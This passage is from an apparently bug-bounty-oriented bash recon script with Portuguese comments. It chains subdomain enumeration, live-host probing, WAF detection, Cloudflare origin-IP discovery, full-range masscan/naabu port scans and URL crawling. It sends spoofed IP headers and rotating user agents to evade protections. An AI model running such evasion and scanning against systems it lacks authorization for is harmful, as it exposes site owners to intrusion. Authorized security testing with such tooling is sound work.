        timeout 10m chaos -l raw/scope.clean.txt -o raw/chaos.txt 2>/dev/null || true &
    fi
    
    # crt.sh via curl
    log_info "Consultando crt.sh..."
    while read -r domain; do
        curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | \
        sed 's/\*\.//g' | sort -u >> raw/crtsh.txt || true &
    done < raw/scope.clean.txt
    
    wait  # Esperar todos terminarem
    
    # Juntar e limpar duplicados
    cat raw/*.txt 2>/dev/null \
      | sed 's/^\s*//; s/\s*$//' \
      | grep -Eo "([a-zA-Z0-9][a-zA-Z0-9\.-]+\.[a-zA-Z]{2,})" \
      | sort -u > subs/all_subs.txt
}

subdomain_enumeration

SUBS_FOUND=$(safe_count subs/all_subs.txt)
log_info "Subdomínios encontrados: $SUBS_FOUND"

# Verificar se temos subdomínios
if [[ ! -s subs/all_subs.txt ]]; then
    log_error "Nenhum subdomínio encontrado!"
    cp raw/scope.clean.txt subs/all_subs.txt
    SUBS_FOUND=$(safe_count subs/all_subs.txt)
fi

send_notification "✅ *FASE 1 COMPLETA*
🌐 $SUBS_FOUND subdomínios encontrados
📊 Expansão: $(echo "scale=2; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x"

# ============= FASE 2: DETECÇÃO DE HOSTS VIVOS & WAF DETECTION ========== 
echo ""
echo "========== FASE 2: DETECÇÃO DE HOSTS VIVOS & TECNOLOGIAS & WAF =========="
send_notification "🔍 *FASE 2: LIVE HOST DETECTION & WAF*
Testando $SUBS_FOUND hosts com httpx e wafw00f..."

# ============= WAF DETECTION FUNCTION =============
waf_detection() {
    if command -v wafw00f >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "🛡️ Executando WAF detection com wafw00f..."
        mkdir -p tech logs
        
        local max_hosts=50
        [[ "$PROFILE" = "light" ]] && max_hosts=20
        [[ "$PROFILE" = "aggressive" ]] && max_hosts=100
        
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
            
            timeout 30s wafw00f "$url" -o tech/waf_${safe}.txt 2>>logs/wafw00f_errors.log || true
        done
        
        # Consolidar resultados
        if ls tech/waf_*.txt >/dev/null 2>&1; then
            cat tech/waf_*.txt | grep -E "is behind|protected by" > tech/waf_summary.txt 2>/dev/null || true
            
            # Contar WAFs detectados
            local waf_count=$(grep -c "is behind" tech/waf_summary.txt 2>/dev/null || echo "0")
            waf_count=$(echo "$waf_count" | tr -d '\n' | tr -d ' ')
            
            if [[ "${waf_count:-0}" -gt 0 ]]; then
                log_info "⚠️  $waf_count WAFs detectados! Revise tech/waf_summary.txt"
                send_notification "🛡️ *WAF DETECTION*
🚨 $waf_count Web Application Firewalls detectados!
📄 Detalhes em: tech/waf_summary.txt
💡 Considere bypass techniques para esses alvos" "true"
            else
                log_info "✅ Nenhum WAF detectado nos alvos testados"
            fi
        fi
    else
        log_info "wafw00f não instalado - pulando WAF detection"
        log_info "💡 Instale com: sudo apt install wafw00f (ou pipx install wafw00f)"
    fi
}

# ============= CLOUDFLARE BYPASS AVANÇADO =============
cloudflare_bypass() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host para bypass de Cloudflare"
        return 0
    fi
    
    log_info "🔥 Iniciando técnicas de Cloudflare bypass..."
    mkdir -p reports/cloudflare_bypass
    
    # 1. CloudFlair - DNS History Mining
    if command -v cloudflair >/dev/null 2>&1; then
        log_info "[CF Bypass] Executando CloudFlair..."
        head -5 alive/hosts_only.txt | while read -r domain; do
            timeout 60s cloudflair "$domain" 2>/dev/null >> reports/cloudflare_bypass/cloudflair_results.txt || true
        done
    fi
    
    # 2. CrimeFlare Database
    log_info "[CF Bypass] Consultando CrimeFlare database..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi" -d "cfS=$domain" 2>/dev/null >> reports/cloudflare_bypass/crimeflare_results.txt || true
    done
    
    # 3. DNS History via ViewDNS
    log_info "[CF Bypass] Verificando DNS history..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "https://viewdns.info/iphistory/?domain=$domain" 2>/dev/null >> reports/cloudflare_bypass/dns_history.txt || true
    done
    
    # 4. Testar subdomínios comuns desprotegidos
    log_info "[CF Bypass] Testando subdomínios desprotegidos..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        for prefix in origin direct ftp admin dev test staging; do
            dig +short "${prefix}.${domain}" 2>/dev/null >> reports/cloudflare_bypass/unprotected_subs.txt || true
        done
    done
    
    # 5. Shodan search (se disponível)
    if command -v shodan >/dev/null 2>&1; then
        log_info "[CF Bypass] Pesquisando no Shodan..."
        head -3 alive/hosts_only.txt | while read -r domain; do
            timeout 30s shodan search "hostname:$domain" 2>/dev/null >> reports/cloudflare_bypass/shodan_results.txt || true
        done
    fi
    
    # 6. SSL Certificate Lookup via crt.sh
    log_info "[CF Bypass] Consultando certificados SSL..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
            jq -r '.[].name_value' 2>/dev/null | sort -u >> reports/cloudflare_bypass/ssl_certs.txt || true
    done
    
    # 7. Wayback Machine CDN History
    log_info "[CF Bypass] Verificando Wayback Machine..."
    head -5 alive/hosts_only.txt | while read -r domain; do
        curl -s "http://archive.org/wayback/available?url=$domain" 2>/dev/null | \
            jq -r '.archived_snapshots.closest.url' 2>/dev/null >> reports/cloudflare_bypass/wayback_urls.txt || true
    done
    
    log_info "✅ Cloudflare bypass techniques completas"
}

live_host_detection() {
    log_info "Executando httpx para detectar hosts vivos e tecnologias..."
    
    if command -v httpx >/dev/null 2>&1 && [[ -s subs/all_subs.txt ]]; then
        # Verificar suporte a flags
        if httpx --help 2>/dev/null | grep -q '\-rl'; then
            HTTPX_FLAGS="-rl $RATE_LIMIT"
        else
            HTTPX_FLAGS=""
        fi
        
        # Array de User-Agents para rotação
        local USER_AGENTS=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
        )
        local RANDOM_UA="${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
        
        # Cloudflare bypass com delays e rotação
        log_info "🔥 Usando User-Agent rotativo e bypass headers para evitar bloqueios..."
        
        httpx -l subs/all_subs.txt -silent -threads "$((CONCURRENCY / 2))" $HTTPX_FLAGS \
              -tech-detect -status-code -title -ip \
              -H "User-Agent: $RANDOM_UA" \
              -H "X-Forwarded-For: 127.0.0.1" \
              -H "X-Originating-IP: 127.0.0.1" \
              -H "X-Remote-IP: 127.0.0.1" \
              -H "X-Remote-Addr: 127.0.0.1" \
              -H "CF-Connecting-IP: 127.0.0.1" \
              -H "True-Client-IP: 127.0.0.1" \
              -H "X-Forwarded-Host: 127.0.0.1" \
              -delay 2s \
              -o alive/httpx_results.txt 2>/dev/null || true
        
        sleep 3  # Delay entre scans
        
        # Saída JSON também com bypass headers e delay
        httpx -l subs/all_subs.txt -silent -json -threads "$((CONCURRENCY / 2))" $HTTPX_FLAGS \
              -tech-detect \
              -H "User-Agent: $RANDOM_UA" \
              -H "X-Forwarded-For: 127.0.0.1" \
              -H "X-Originating-IP: 127.0.0.1" \
              -H "X-Remote-IP: 127.0.0.1" \
              -H "CF-Connecting-IP: 127.0.0.1" \
              -H "True-Client-IP: 127.0.0.1" \
              -delay 2s \
              -o alive/httpx.json 2>/dev/null || true
        
        # Processar resultados
        if [[ -s alive/httpx_results.txt ]]; then
            awk '{print $1}' alive/httpx_results.txt | sed 's/,$//' | sort -u > alive/hosts.txt || true
            cat alive/hosts.txt | sed -E 's@https?://@@' | sed 's@/.*@@' | sort -u > alive/hosts_only.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    live_host_detection
    cloudflare_bypass  # Adicionar bypass do Cloudflare
    waf_detection  # Adicionar detecção de WAF
else
    log_info "DRY-RUN: Pulando detecção de hosts vivos"
    # Criar arquivos mock no modo dry-run
    head -10 subs/all_subs.txt > alive/hosts_only.txt
    sed 's/^/https:\/\//' alive/hosts_only.txt > alive/hosts.txt
fi

LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
log_info "Live hosts: $LIVE_HOSTS"

# Verificar se temos hosts vivos  
if [[ ! -s alive/hosts_only.txt ]]; then
    log_error "Nenhum host vivo encontrado! Continuando com escopo original..."
    cp raw/scope.clean.txt alive/hosts_only.txt
    sed 's/^/https:\/\//' raw/scope.clean.txt > alive/hosts.txt
    LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
fi

# ============= COMBINAR SUBDOMÍNIOS COM HOSTS VIVOS =============
log_info "🔄 Combinando todos os subdomínios com hosts vivos para máxima cobertura..."

# Criar lista consolidada com TODOS os subdomínios descobertos + hosts vivos
cat subs/all_subs.txt alive/hosts_only.txt 2>/dev/null | sort -u > alive/all_targets.txt

# Criar versão com protocolos (http/https) para todas as targets
{
    # Adicionar https:// para todos os subdomínios
    sed 's/^/https:\/\//' subs/all_subs.txt 2>/dev/null || true
    # Adicionar http:// também para aumentar cobertura
    sed 's/^/http:\/\//' subs/all_subs.txt 2>/dev/null || true
    # Incluir hosts vivos que já têm protocolo
    cat alive/hosts.txt 2>/dev/null || true
} | sort -u > alive/all_targets_with_protocol.txt

TOTAL_TARGETS=$(safe_count alive/all_targets.txt)
log_success "✅ Total de alvos para scanning: $TOTAL_TARGETS ($SUBS_FOUND subdomínios + $LIVE_HOSTS hosts vivos confirmados)"

send_notification "✅ *FASE 2 COMPLETA*
✅ $LIVE_HOSTS hosts ativos
🎯 $TOTAL_TARGETS alvos totais (subdomínios + hosts)
📊 Taxa de sucesso: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%"

# ============= CLOUDFLARE BYPASS & DETECTION =============
cloudflare_bypass() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "Nenhum host para testar Cloudflare bypass"
        return
    fi
    
    log_info "☁️  Iniciando detecção e bypass do Cloudflare..."
    mkdir -p tech/cloudflare logs/cloudflare
    
    # Função para detectar Cloudflare
    detect_cloudflare() {
        local url="$1"
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Método 1: Check headers
        local cf_headers=$(curl -sI "$url" -m 10 2>/dev/null | grep -iE "cf-ray|cloudflare|__cfduid" || true)
        
        # Método 2: Check DNS
        local cf_ips=$(dig +short "$domain" 2>/dev/null | grep -E "^(104\.(1[6-9]|2[0-9]|3[01])\.|188\.114\.|162\.159\.|172\.(6[4-9]|7[0-9])\.|131\.0\.72\.|141\.101\.|103\.2[12]\.|103\.3[12]\.)" || true)
        
        if [[ -n "$cf_headers" ]] || [[ -n "$cf_ips" ]]; then
            echo "$url" >> tech/cloudflare/cf_protected.txt
            log_info "🛡️  Cloudflare detectado em: $url"
            return 0
        fi
        return 1
    }
    
    # Detectar hosts protegidos pelo Cloudflare
    log_info "Detectando hosts protegidos pelo Cloudflare..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        detect_cloudflare "$url" &
        
        # Limitar paralelismo
        if [[ $(jobs -r | wc -l) -ge "$PARALLEL_HOSTS" ]]; then
            wait -n
        fi
    done < alive/hosts.txt
    wait
    
    # Se nenhum Cloudflare detectado, retornar
    if [[ ! -s tech/cloudflare/cf_protected.txt ]]; then
        log_info "✅ Nenhum Cloudflare detectado"
        return
    fi
    
    local cf_count=$(wc -l < tech/cloudflare/cf_protected.txt | tr -d ' ')
    log_info "🛡️  $cf_count hosts protegidos pelo Cloudflare detectados"
    
    send_notification "☁️ *CLOUDFLARE DETECTION*
🛡️ $cf_count hosts protegidos detectados
🔍 Iniciando bypass techniques..." "true"
    
    # ============= BYPASS TÉCNICAS =============
    
    # Técnica 1: CloudFlair - Encontrar IPs reais via DNS history
    if command -v cloudflair >/dev/null 2>&1; then
        log_info "🔍 Técnica 1: CloudFlair - Buscando IPs reais via DNS history..."
        while IFS= read -r url || [[ -n "$url" ]]; do
            local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
            local safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
            
            timeout 60s cloudflair -o tech/cloudflare/cloudflair_${safe}.txt "$domain" 2>>logs/cloudflare/cloudflair_errors.log || true
        done < tech/cloudflare/cf_protected.txt
        
        # Consolidar IPs reais encontrados
        if ls tech/cloudflare/cloudflair_*.txt >/dev/null 2>&1; then
            cat tech/cloudflare/cloudflair_*.txt | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u > tech/cloudflare/real_ips.txt
            local real_ips=$(wc -l < tech/cloudflare/real_ips.txt | tr -d ' ')
            if [[ "$real_ips" -gt 0 ]]; then
                log_info "✅ CloudFlair encontrou $real_ips IPs reais potenciais!"
                send_notification "🎯 *CLOUDFLARE BYPASS SUCCESS*
📍 CloudFlair encontrou $real_ips IPs reais!
📄 Veja: tech/cloudflare/real_ips.txt" "true"
            fi
        fi
    else
        log_info "💡 CloudFlair não instalado: use 'pipx install cloudflair' (recomendado em Kali/Debian)"
    fi
    
    # Técnica 2: CrimeFlare Database
    log_info "🔍 Técnica 2: Consultando CrimeFlare database..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Buscar em CrimeFlare API
        curl -s "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi" \
            -d "cfS=$domain" 2>/dev/null | \
            grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" >> tech/cloudflare/crimeflare_ips.txt || true
    done < tech/cloudflare/cf_protected.txt
    
    if [[ -s tech/cloudflare/crimeflare_ips.txt ]]; then
        sort -u tech/cloudflare/crimeflare_ips.txt > tech/cloudflare/crimeflare_ips_unique.txt
        local crime_ips=$(wc -l < tech/cloudflare/crimeflare_ips_unique.txt | tr -d ' ')
        log_info "✅ CrimeFlare encontrou $crime_ips IPs potenciais"
    fi
    
    # Técnica 3: DNS History via SecurityTrails/others
    log_info "🔍 Técnica 3: DNS History lookup..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        local safe=$(echo "$domain" | sed 's/[^a-zA-Z0-9]/_/g')
        
        # ViewDNS.info history
        curl -s "https://viewdns.info/iphistory/?domain=$domain" 2>/dev/null | \
            grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | \
            grep -v "104\." | grep -v "188\.114" | grep -v "162\.159" >> tech/cloudflare/dns_history_${safe}.txt || true
            
        sleep 1  # Rate limiting cortesia
    done < tech/cloudflare/cf_protected.txt
    
    if ls tech/cloudflare/dns_history_*.txt >/dev/null 2>&1; then
        cat tech/cloudflare/dns_history_*.txt | sort -u > tech/cloudflare/historical_ips.txt
        local hist_ips=$(wc -l < tech/cloudflare/historical_ips.txt | tr -d ' ')
        if [[ "$hist_ips" -gt 0 ]]; then
            log_info "✅ DNS History encontrou $hist_ips IPs históricos"
        fi
    fi
    
    # Técnica 4: Subdomain scanning para encontrar hosts não protegidos
    log_info "🔍 Técnica 4: Buscando subdomínios não protegidos..."
    while IFS= read -r url || [[ -n "$url" ]]; do
        local domain=$(echo "$url" | sed -E 's@https?://@@' | sed 's@/.*@@')
        
        # Testar subdomínios comuns que podem não estar atrás do CF
        for sub in origin direct ftp mail smtp pop cpanel whm admin dev staging test backup; do
            local test_domain="${sub}.${domain}"
            local test_ip=$(dig +short "$test_domain" 2>/dev/null | head -1 | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" || true)
            
            if [[ -n "$test_ip" ]] && [[ ! "$test_ip" =~ ^104\. ]] && [[ ! "$test_ip" =~ ^188\.114 ]]; then
                echo "$test_domain -> $test_ip" >> tech/cloudflare/unprotected_subs.txt
            fi
        done
    done < tech/cloudflare/cf_protected.txt
    
    if [[ -s tech/cloudflare/unprotected_subs.txt ]]; then
        local unprot=$(wc -l < tech/cloudflare/unprotected_subs.txt | tr -d ' ')
        log_info "✅ Encontrados $unprot subdomínios potencialmente desprotegidos"
    fi
    
    # Consolidar TODOS os IPs encontrados
    cat tech/cloudflare/real_ips.txt \
        tech/cloudflare/crimeflare_ips_unique.txt \
        tech/cloudflare/historical_ips.txt 2>/dev/null | \
        sort -u > tech/cloudflare/all_bypass_ips.txt || true
    
    local total_bypass=$(wc -l < tech/cloudflare/all_bypass_ips.txt 2>/dev/null | tr -d ' ' || echo 0)
    
    # Criar arquivo de bypass headers para uso posterior
    cat > tech/cloudflare/bypass_headers.txt << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
EOF
    
    # Gerar relatório final
    cat > tech/cloudflare/BYPASS_REPORT.txt << EOF
========================================
🛡️  CLOUDFLARE BYPASS REPORT
========================================
📊 Hosts protegidos detectados: $cf_count
🎯 IPs reais encontrados: $total_bypass
📍 Subdomínios desprotegidos: $(wc -l < tech/cloudflare/unprotected_subs.txt 2>/dev/null || echo 0)

📁 Arquivos gerados:
- tech/cloudflare/cf_protected.txt (hosts protegidos)
- tech/cloudflare/all_bypass_ips.txt (IPs reais consolidados)
- tech/cloudflare/unprotected_subs.txt (subdomínios sem CF)
- tech/cloudflare/bypass_headers.txt (headers de bypass)

💡 PRÓXIMOS PASSOS:
1. Teste acesso direto aos IPs: curl -H "Host: domain.com" http://IP
2. Use bypass headers em todas as requisições
3. Configure hosts file: IP domain.com
4. Teste subdomínios desprotegidos primeiro

⚠️  TÉCNICAS DE EVASÃO ATIVAS:
- User-Agent rotation habilitado
- Headers de bypass configurados
- IPs diretos mapeados
- Rate limiting inteligente aplicado

🔐 LEMBRE-SE: Use apenas com autorização!
========================================
EOF
    
    cat tech/cloudflare/BYPASS_REPORT.txt
    
    if [[ "$total_bypass" -gt 0 ]]; then
        send_telegram_status "🎯 *CLOUDFLARE BYPASS COMPLETE*
✅ $total_bypass IPs reais descobertos!
📊 $(wc -l < tech/cloudflare/unprotected_subs.txt 2>/dev/null || echo 0) subdomínios desprotegidos
📄 Relatório: tech/cloudflare/BYPASS_REPORT.txt

💡 Use: curl -H 'Host: domain.com' http://REAL_IP" "true"
    else
        log_info "⚠️  Nenhum IP real encontrado. Considere técnicas manuais."
    fi
}

# ============= FASE 3: SCANNING DE PORTAS CONTROLADO =============
echo ""
echo "========== FASE 3: PORT SCANNING =========="
send_notification "🔍 *FASE 3: PORT SCANNING*
Escaneando portas em $LIVE_HOSTS hosts..."

port_scanning() {
    # ETAPA 1: MASSCAN - Ultra-rápido pre-scan
    if command -v masscan >/dev/null 2>&1 && [[ -s alive/hosts_only.txt ]] && [[ "$DRY_RUN" = "false" ]]; then
        log_info "🚀 ETAPA 1: Executando MASSCAN para descoberta ultra-rápida..."
        mkdir -p ports/masscan
        
        # Verificar se temos IPs ou precisa resolver
        local has_ips=false
        head -1 alive/hosts_only.txt | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' && has_ips=true
        
        if [[ "$has_ips" = "true" ]]; then
            # Scan com rate SEGURO para não derrubar a internet
            log_info "⚠️  Usando rate SEGURO: ${MASSCAN_RATE:-500} pacotes/seg (não vai derrubar sua internet)"
            timeout 45m masscan -p1-65535 \
                --rate "${MASSCAN_RATE:-500}" \
                -iL alive/hosts_only.txt \
                -oL ports/masscan/masscan_results.txt \
                --wait 2 \
                --open 2>/dev/null || true
            
            # Processar resultados do masscan
            if [[ -s ports/masscan/masscan_results.txt ]]; then
                grep "^open" ports/masscan/masscan_results.txt | \
                    awk '{print $4":"$3}' | sort -u > ports/masscan/masscan_ports.txt || true
                
                local masscan_ports=$(wc -l < ports/masscan/masscan_ports.txt 2>/dev/null || echo 0)
                log_info "✅ Masscan encontrou $masscan_ports portas abertas"
            fi
        else
            log_info "🔎 Resolvendo IPs para masscan..."
            awk '{print $1}' alive/hosts_only.txt | xargs -I{} sh -c 'dig +short A {} || true' | \
                grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ports/masscan/ips.txt 2>/dev/null || true
            
            if [[ -s ports/masscan/ips.txt ]]; then
                log_info "⚠️  Usando rate SEGURO: ${MASSCAN_RATE:-500} pacotes/seg"
                timeout 45m masscan -p1-65535 \
                    --rate "${MASSCAN_RATE:-500}" \
                    -iL ports/masscan/ips.txt \
                    -oL ports/masscan/masscan_results.txt \
                    --wait 2 \
                    --open 2>/dev/null || true
            fi
        fi
    fi
    
    # ETAPA 2: NAABU - Verificação e service detection
    if command -v naabu >/dev/null 2>&1 && [[ -s alive/hosts_only.txt ]]; then
        log_info "🔥 ETAPA 2: Executando naabu BRUTAL MODE..."
        
        # Inicia os arrays de flags
        local NAABU_FLAGS=()
        local PORT_ARG=()

        # Adiciona a flag de rate-limit se a versão do naabu suportar
        if naabu --help 2>/dev/null | grep -q '\-rate'; then
            NAABU_FLAGS=(-rate "$RATE_LIMIT")
        fi
        
        # Se temos resultados do masscan, usar apenas essas portas
        if [[ -s ports/masscan/masscan_ports.txt ]]; then
            log_info "📍 Usando portas descobertas pelo masscan para verificação..."
            # Extrair apenas números de portas únicos
            awk -F':' '{print $2}' ports/masscan/masscan_ports.txt | sort -un | tr '\n' ',' | sed 's/,$//' > ports/masscan/ports_only.txt
            PORT_ARG=(-p "$(cat ports/masscan/ports_only.txt)")
        elif [[ "$NAABU_TOP_PORTS" == "full" ]]; then
            # Full scan de todas as 65535 portas
            PORT_ARG=(-p "-")
        else
            # Top ports expandido
            PORT_ARG=(-tp "$NAABU_TOP_PORTS") 
        fi
        
        # Executa o comando naabu COM TRATAMENTO DE ERROS ROBUSTO
        log_info "🔥 Executando naabu... (pode demorar)"
        
        # Primeira tentativa: modo normal
        if timeout "$TIMEOUT_PER_HOST" naabu -list alive/hosts_only.txt \
            "${PORT_ARG[@]}" \
            "${NAABU_FLAGS[@]}" \
            -c "$CONCURRENCY" \
            -retries 2 \
            -warm-up-time 1 \
            -timeout 2000 \
            -verify \
            -no-color \
            -exclude-cdn \
            -silent \
            -o ports/naabu_raw.txt 2>logs/naabu_errors.log; then
            log_info "✅ Naabu completou com sucesso"
        else
            log_info "⚠️ Naabu teve problemas, tentando modo simplificado..."
            # Segunda tentativa: modo simplificado
            timeout "$TIMEOUT_PER_HOST" naabu -list alive/hosts_only.txt \
                "${PORT_ARG[@]}" \
                -c 10 \
                -silent \
                -o ports/naabu_raw.txt 2>>logs/naabu_errors.log || {
                    log_error "❌ Naabu falhou completamente - continuando sem port scan"
                    touch ports/naabu_raw.txt
                }
        fi
            
        if [[ -s ports/naabu_raw.txt ]]; then
            sort -u ports/naabu_raw.txt > ports/naabu.txt || true
            awk -F":" '{print $1}' ports/naabu.txt | sort -u > ports/hosts_with_ports.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    port_scanning
else
    log_info "DRY-RUN: Pulando port scanning"
    touch ports/naabu.txt ports/hosts_with_ports.txt
fi

PORTS_FOUND=$(safe_count ports/naabu.txt)
HOSTS_WITH_PORTS=$(safe_count ports/hosts_with_ports.txt)

send_notification "✅ *FASE 3 COMPLETA*
🚪 $PORTS_FOUND portas abertas
🏠 $HOSTS_WITH_PORTS hosts com portas"


# ============= GETJS COLLECTION IMPLEMENTADA COM DETECÇÃO MELHORADA =============
# Função detect_getjs() movida para o topo do script (antes de check_tools)

getjs_collection() {
    local getjs_bin
    getjs_bin="$(detect_getjs)"

    if [[ -n "$getjs_bin" ]] && [[ -s alive/hosts.txt ]]; then
        # Verificar suporte às flags (precisamos de -url)
        if "$getjs_bin" -h 2>&1 | grep -q '\-url'; then
            log_info "Executando getJS ($getjs_bin) para extrair fontes JS..."
            mkdir -p js/getjs logs

            local processed=0
            local max_hosts=20

            head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
                processed=$((processed + 1))
                safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
                log_info "[getJS $processed/$max_hosts] Processando: $url"

                tmp_err="$(mktemp)"
                if timeout 120s "$getjs_bin" \
                    -complete \
                    -threads 3 \
                    -timeout 30s \
                    -output "js/getjs/getjs_${safe}.txt" \
                    -url "$url" 2>"$tmp_err"; then
                    if [[ -s "js/getjs/getjs_${safe}.txt" ]]; then
                        grep -E "\.js(\?|$)" "js/getjs/getjs_${safe}.txt" 2>/dev/null >> js/js_urls_getjs.txt || true
                    fi
                else
                    echo "[$(date '+%H:%M:%S')] getJS error url=$url exit=$? $(tail -n 2 "$tmp_err" | tr '\n' ' ')" >> logs/getjs_errors.log
                    rm -f "js/getjs/getjs_${safe}.txt" 2>/dev/null || true
                fi
                rm -f "$tmp_err" 2>/dev/null || true
            done

            if [[ -s js/js_urls_getjs.txt ]]; then
                # Mesclar e deduplicar com outras fontes
                if [[ -s js/js_urls_raw.txt ]]; then
                    cat js/js_urls_getjs.txt >> js/js_urls_raw.txt
                else
                    cp js/js_urls_getjs.txt js/js_urls_raw.txt
                fi
                sort -u js/js_urls_raw.txt -o js/js_urls_raw.txt
            fi

            log_info "getJS collection finalizada."
        else
            log_info "getJS detectado, mas flags não suportadas (sem '-url'); pulando com fallback."
        fi
    else
        log_info "getJS não disponível ou nenhum host para processar."
        : > js/js_urls_getjs.txt
    fi
}

# ============= FASE 4: CRAWLING E COLETA DE URLs APRIMORADA =============
echo ""
echo "========== FASE 4: CRAWLING & URL COLLECTION =========="
send_notification "🕷️ *FASE 4: URL CRAWLING*
Coletando URLs com múltiplas ferramentas..."

url_collection() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_error "Nenhum host vivo para fazer crawling!"
        touch urls/all_urls_raw.txt urls/with_params.txt js/js_urls_raw.txt
        return
    fi
    
    # GAU
    if command -v gau >/dev/null 2>&1; then
        log_info "Executando gau..."
        mkdir -p urls/gau
        cat alive/hosts_only.txt | head -20 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'domain="{}"; timeout 60s gau "$domain" 2>/dev/null || true' > urls/gau.txt || true
    fi
    
    # Waybackurls
    if command -v waybackurls >/dev/null 2>&1; then
        log_info "Executando waybackurls..."
        timeout 10m cat alive/hosts_only.txt | head -10 | while read host; do
            echo "$host" | timeout 30s waybackurls 2>/dev/null || true
        done > urls/wayback.txt || true
    fi
    
    # Hakrawler
    if command -v hakrawler >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando hakrawler..."
        cat alive/hosts.txt | head -10 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'timeout 45s echo {} | hakrawler -d '"$MAX_CRAWL_DEPTH"' -subs -t 10 2>/dev/null || true' >> urls/hakrawler.txt || true
    fi
    
    # Katana com CRAWLING PROFUNDO
    if command -v katana >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando katana com crawling profundo..."
        mkdir -p urls/katana
        cat alive/hosts.txt | head -10 | while read -r host; do
            safe=$(echo "$host" | sed 's/[^a-zA-Z0-9]/_/g')
            timeout 180s katana -u "$host" \
                -d 10 \
                -jc \
                -aff \
                -fx \
                -retry 3 \
                -timeout 30 \
                -c 50 \
                -rl 500 \
                -silent \
                -o "urls/katana/katana_${safe}.txt" 2>/dev/null || true
        done
        cat urls/katana/*.txt 2>/dev/null >> urls/katana.txt || true
    fi
    
    # FFUF - REMOVIDO (bruteforce não é recomendado em bug bounty)
    # Directory bruteforcing pode gerar tráfego excessivo e ser considerado intrusivo
    # Para descoberta de diretórios, use ferramentas passivas como waybackurls, gau, etc.
    log_info "⚠️  FFUF bruteforce DESABILITADO (contra princípios de bug bounty ético)"
    
    # Gospider (se disponível)
    if command -v gospider >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando gospider..."
        cat alive/hosts.txt | head -5 | \
        xargs -P "$PARALLEL_HOSTS" -I{} timeout 60s gospider -s {} -d "$MAX_CRAWL_DEPTH" -c 10 -t 20 2>/dev/null | \
        grep -Eo 'https?://[^[:space:]]+' >> urls/gospider.txt || true
    fi
}

url_collection

# Merge e limpar URLs coletadas
cat urls/*.txt 2>/dev/null | grep -E "https?://" | sort -u > urls/all_urls_raw.txt || true

# Extrair URLs parametrizadas
grep -E "\?" urls/all_urls_raw.txt | sort -u > urls/with_params.txt || true

# Extrair arquivos JS
grep -E "\.js(\?|$)" urls/all_urls_raw.txt | sed -E 's#\?.*##' | sort -u > js/js_urls_raw.txt || true

# Extrair endpoints de API
grep -Ei "/api/|/graphql|/v[0-9]+/|\.json|\.asmx" urls/all_urls_raw.txt > apis/api_endpoints.txt 2>/dev/null || true

# Integrar getJS (se disponível) antes de contar/relatar
getjs_collection

